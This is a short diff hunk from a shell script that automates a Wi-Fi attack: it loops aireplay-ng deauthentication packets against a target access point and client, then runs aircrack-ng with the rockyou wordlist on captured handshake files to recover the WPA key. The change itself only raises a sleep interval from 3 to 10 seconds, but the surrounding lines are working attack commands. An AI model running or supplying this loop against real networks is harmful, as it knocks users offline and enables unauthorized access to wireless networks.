@@ -20,7 +20,7 @@ HSHAKE="temp"
 while [ -n "$HSHAKE" ]
 do
 	aireplay-ng -0 5 -a $APMAC -c $CLMAC $INTERFACE
-	sleep 3
+	sleep 10
 
 	# Attempts to obtain WPA handshake by saving to output file
 	aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/$PSKFILE*.cap > dumpfiles/$PSKFILE.txt &
